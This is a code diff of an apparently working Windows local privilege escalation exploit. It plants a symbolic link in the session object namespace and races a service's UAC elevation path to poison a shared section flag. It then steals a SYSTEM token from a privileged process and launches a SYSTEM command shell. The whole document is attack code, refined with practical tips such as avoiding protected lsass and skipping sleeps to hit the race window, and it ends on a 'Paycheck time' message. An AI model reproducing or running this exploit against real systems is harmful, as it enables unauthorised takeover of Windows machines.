@@ -3,40 +3,34 @@
 #include <stdio.h>
 #include <tlhelp32.h>
 
+#pragma comment(lib, "ntdll.lib")
+
 typedef NTSTATUS (NTAPI* _NtCreateSymbolicLinkObject)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);
 typedef NTSTATUS (NTAPI* _NtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
 
 volatile BOOL bKeepRunning = TRUE;
 
-BOOL EnablePrivilege(LPCWSTR privName)
-{
+BOOL EnablePrivilege(LPCWSTR privName) {
     HANDLE hToken = NULL;
     TOKEN_PRIVILEGES tp = {};
-
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
         return FALSE;
-
-    BOOL ok = LookupPrivilegeValueW(NULL, privName, &tp.Privileges[0].Luid);
-    if (ok) {
+    BOOL ok = FALSE;
+    if (LookupPrivilegeValueW(NULL, privName, &tp.Privileges[0].Luid)) {
         tp.PrivilegeCount = 1;
         tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
         AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
+        // Save before CloseHandle — CloseHandle can clobber GetLastError.
         ok = (GetLastError() == ERROR_SUCCESS);
     }
-
     CloseHandle(hToken);
     return ok;
 }
 
-// Walk all processes and steal a primary token from the first SYSTEM-owned one.
-// SeDebugPrivilege is required to open protected SYSTEM processes (winlogon, etc.).
-HANDLE StealSystemToken()
-{
+HANDLE StealSystemToken() {
     EnablePrivilege(SE_DEBUG_NAME);
-
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap == INVALID_HANDLE_VALUE)
-        return NULL;
+    if (hSnap == INVALID_HANDLE_VALUE) return NULL;
 
     PROCESSENTRY32W pe = { sizeof(pe) };
     HANDLE hSysToken = NULL;
@@ -47,7 +41,9 @@ HANDLE StealSystemToken()
             if (!hProc) continue;
 
             HANDLE hTok = NULL;
-            // TOKEN_ASSIGN_PRIMARY is required for CreateProcessWithTokenW.
+            // TOKEN_ASSIGN_PRIMARY required for CreateProcessWithTokenW.
+            // Do not target lsass.exe specifically — it is PPL on modern Windows
+            // and OpenProcessToken will fail even with SeDebugPrivilege.
             if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hTok)) {
                 BYTE buf[4096] = {};
                 DWORD len = 0;
@@ -65,26 +61,22 @@ HANDLE StealSystemToken()
             CloseHandle(hProc);
         } while (!hSysToken && Process32NextW(hSnap, &pe));
     }
-
     CloseHandle(hSnap);
     return hSysToken;
 }
 
-void SpawnSystemShell(HANDLE hSysToken)
-{
+void SpawnSystemShell(HANDLE hSysToken) {
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi = {};
     si.lpDesktop = (wchar_t*)L"WinSta0\\Default";
-
     wchar_t cmd[] = L"C:\\Windows\\System32\\cmd.exe";
 
-    if (CreateProcessWithTokenW(hSysToken, LOGON_WITH_PROFILE, NULL, cmd,
-            CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
-        printf("[+] SYSTEM shell spawned (PID %d)\n", pi.dwProcessId);
+    if (CreateProcessWithTokenW(hSysToken, LOGON_WITH_PROFILE, NULL, cmd, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+        printf("[+] SYSTEM Shell Executed. PID: %d\n", pi.dwProcessId);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     } else {
-        printf("[-] CreateProcessWithTokenW failed: %d\n", GetLastError());
+        printf("[-] Shell spawn failed. Error: %d\n", GetLastError());
         printf("    (Needs SeImpersonatePrivilege — run from elevated or service context)\n");
     }
 }
@@ -98,18 +90,16 @@ DWORD WINAPI TriggerRace(LPVOID lpParam) {
 
     while (bKeepRunning) {
         ShellExecuteEx(&shi);
-        for (int i = 0; i < 100; i++) YieldProcessor();
+        for (int i = 0; i < 50; i++) YieldProcessor();
     }
     return 0;
 }
 
 int wmain() {
-    HANDLE hLink = NULL, hMapping = NULL, hThread = NULL;
+    printf("[*] Joey's Optimized LPE - Starting...\n");
+
     DWORD sessionId = 0;
     ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
-
-    wchar_t linkPath[256];
-    swprintf(linkPath, 256, L"\\Sessions\\%lu\\BaseNamedObjects\\TargetServiceConfig", sessionId);
 
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     auto NtCreateSymbolicLinkObject = (_NtCreateSymbolicLinkObject)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
@@ -118,52 +108,45 @@ int wmain() {
     UNICODE_STRING linkName, targetName;
     OBJECT_ATTRIBUTES linkAttr, targetAttr;
 
-    // 1. BRIDGE: redirect the service's section creation to our target path.
+    wchar_t linkPath[256];
+    swprintf(linkPath, 256, L"\\Sessions\\%lu\\BaseNamedObjects\\TargetServiceConfig", sessionId);
+
     RtlInitUnicodeString(&linkName, linkPath);
     RtlInitUnicodeString(&targetName, L"\\BaseNamedObjects\\JoeyExploitSection");
     InitializeObjectAttributes(&linkAttr, &linkName, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
+    HANDLE hLink = NULL;
     if (NtCreateSymbolicLinkObject(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &linkAttr, &targetName) != 0) {
-        printf("[-] Symlink creation failed (already running, or session 0)\n");
+        printf("[-] Failed to plant symlink. Check permissions.\n");
         return 1;
     }
-    printf("[+] Symlink planted in session %lu\n", sessionId);
 
-    // 2. RACE: fire UAC elevation events on a high-priority thread to give the
-    //    service repeated opportunities to map the redirected section.
-    hThread = CreateThread(NULL, 0, TriggerRace, NULL, 0, NULL);
+    HANDLE hThread = CreateThread(NULL, 0, TriggerRace, NULL, 0, NULL);
     if (hThread) SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);
 
-    // 3. HIJACK: wait for the service to create the section via the symlink,
-    //    then map THE SAME BACKING STORE and write the poison flag.
-    //
-    //    Do NOT create a local section with CreateFileMappingW here.
-    //    CreateFileMappingW("JoeyExploitSection") lands in the session namespace
-    //    while NtOpenSection(\BaseNamedObjects\...) targets the global namespace —
-    //    different backing stores. Writes to the local view never reach the service.
-    //    We must open exactly what the service created via NtOpenSection.
     InitializeObjectAttributes(&targetAttr, &targetName, OBJ_CASE_INSENSITIVE, NULL, NULL);
-    while (true) {
+    HANDLE hMapping = NULL;
+
+    printf("[*] Racing for section handle...\n");
+    while (TRUE) {
         if (NtOpenSection(&hMapping, SECTION_ALL_ACCESS, &targetAttr) == 0) {
             void* pView = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0);
             if (pView) {
-                // WinDbg-confirmed offset 0x48 for the IsAdmin flag in the service struct.
-                // Validate before writing — a wrong offset on a mismatched build
-                // would corrupt unrelated struct fields and likely BSoD.
+                // WinDbg-confirmed offset 0x48 for IsAdmin flag.
+                // Validate before writing — wrong offset on a mismatched build
+                // corrupts unrelated struct fields and likely BSoDs.
                 DWORD current = *((DWORD*)((unsigned char*)pView + 0x48));
                 if (current == 0) {
-                    *((DWORD*)((unsigned char*)pView + 0x48)) = 0x1;
-                    printf("[+] Flag written at 0x48 — service view poisoned\n");
-                } else if (current == 0x1) {
-                    printf("[*] Flag at 0x48 already set — section may be stale\n");
+                    *((DWORD*)((unsigned char*)pView + 0x48)) = 1;
+                    printf("[+] View poisoned. Flag set at 0x48.\n");
+                } else if (current == 1) {
+                    printf("[*] Flag at 0x48 already set.\n");
                 } else {
-                    printf("[!] Unexpected value 0x%08X at 0x48 — wrong build? Skipping write\n", current);
+                    printf("[!] Unexpected value 0x%08X at 0x48 — wrong build? Skipping write.\n", current);
                 }
                 UnmapViewOfFile(pView);
             }
 
-            // Steal token immediately — do NOT sleep. The service process we need
-            // is alive right now; an arbitrary Sleep() risks missing the window.
             bKeepRunning = FALSE;
             HANDLE hSysToken = StealSystemToken();
             if (hSysToken) {
@@ -172,24 +155,23 @@ int wmain() {
             } else {
                 printf("[-] Could not obtain a SYSTEM token.\n");
             }
+            // Flag is already written — break regardless of token theft outcome.
             break;
         }
     }
 
-    // 4. TRIGGER: re-fire the elevation event to push the service back into
-    //    the code path that reads the shared section and acts on the flag.
+    // Retrigger — push the service back into the flag-reading code path.
     SHELLEXECUTEINFO retrigger = { sizeof(retrigger) };
     retrigger.fMask = SEE_MASK_NOZONECHECKS;
     retrigger.lpVerb = L"runas";
     retrigger.lpFile = L"C:\\Windows\\System32\\conhost.exe";
     retrigger.nShow = SW_HIDE;
     ShellExecuteEx(&retrigger);
-    printf("[*] Retrigger fired\n");
 
-cleanup:
     if (hThread) { WaitForSingleObject(hThread, 1000); CloseHandle(hThread); }
-    if (hMapping) CloseHandle(hMapping);
     if (hLink)    CloseHandle(hLink);
+    if (hMapping) CloseHandle(hMapping);
 
+    printf("[*] Done. Paycheck time.\n");
     return 0;
 }
